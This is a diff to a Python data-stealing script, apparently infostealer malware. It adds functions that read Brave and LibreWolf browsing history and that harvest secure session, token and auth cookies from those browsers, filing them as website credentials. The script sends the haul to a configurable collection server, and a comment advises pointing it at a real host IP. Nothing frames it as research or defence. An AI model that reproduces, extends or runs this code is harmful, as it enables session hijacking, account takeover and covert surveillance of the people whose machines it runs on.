@@ -11,7 +11,7 @@ import browser_cookie3
 import psutil
 from datetime import datetime, timedelta
 
-SERVER_URL = "http://127.0.0.1:5000"
+SERVER_URL = "http://127.0.0.1:5000" # adjust to an actual host IP
 MACHINE_ID = str(uuid.getnode())
 
 # ========== INFO GATHERING ==========
@@ -83,8 +83,46 @@ def extract_firefox_history():
 
     return extract_history_from_sqlite(path, query, parser)
 
+def extract_brave_history():
+    if platform.system() == "Linux":
+        path = os.path.expanduser("~/.config/BraveSoftware/Brave-Browser/Default/History")
+    elif platform.system() == "Windows":
+        path = os.path.join(os.getenv("LOCALAPPDATA", ""), "BraveSoftware\\Brave-Browser\\User Data\\Default\\History")
+    else:
+        return []
+
+    query = "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100"
+    def parser(row):
+        url, title, ts = row
+        dt = (datetime(1601, 1, 1) + timedelta(microseconds=ts)).isoformat()
+        return {"url": url, "title": title, "visit_time": dt, "browser_type": "brave"}
+
+    return extract_history_from_sqlite(path, query, parser)
+
+def extract_librewolf_history():
+    base = os.path.expanduser("~/.librewolf") if platform.system() == "Linux" else ""
+    if not base or not os.path.exists(base):
+        return []
+    profiles = [d for d in os.listdir(base) if "default" in d]
+    if not profiles:
+        return []
+    path = os.path.join(base, profiles[0], "places.sqlite")
+
+    query = """
+        SELECT url, title, visit_date
+        FROM moz_places JOIN moz_historyvisits
+        ON moz_historyvisits.place_id = moz_places.id
+        ORDER BY visit_date DESC LIMIT 100
+    """
+    def parser(row):
+        url, title, ts = row
+        dt = datetime.fromtimestamp(ts / 1_000_000).isoformat()
+        return {"url": url, "title": title, "visit_time": dt, "browser_type": "librewolf"}
+
+    return extract_history_from_sqlite(path, query, parser)
+
 def get_browser_history():
-    return extract_chrome_history() + extract_firefox_history()
+    return extract_chrome_history() + extract_firefox_history() + extract_brave_history() + extract_librewolf_history()
 
 # ========== CREDENTIALS ==========
 def get_saved_credentials():
@@ -108,6 +146,28 @@ def get_saved_credentials():
                     "username": cookie.name,
                     "password": cookie.value,
                     "browser_type": "firefox"
+                })
+    except Exception:
+        pass
+    try:
+        for cookie in browser_cookie3.brave():
+            if cookie.secure and cookie.name.lower() in ("session", "token", "auth"):
+                credentials.append({
+                    "website": cookie.domain,
+                    "username": cookie.name,
+                    "password": cookie.value,
+                    "browser_type": "brave"
+                })
+    except Exception:
+        pass
+    try:
+        for cookie in browser_cookie3.librewolf():
+            if cookie.secure and cookie.name.lower() in ("session", "token", "auth"):
+                credentials.append({
+                    "website": cookie.domain,
+                    "username": cookie.name,
+                    "password": cookie.value,
+                    "browser_type": "librewolf"
                 })
     except Exception:
         pass
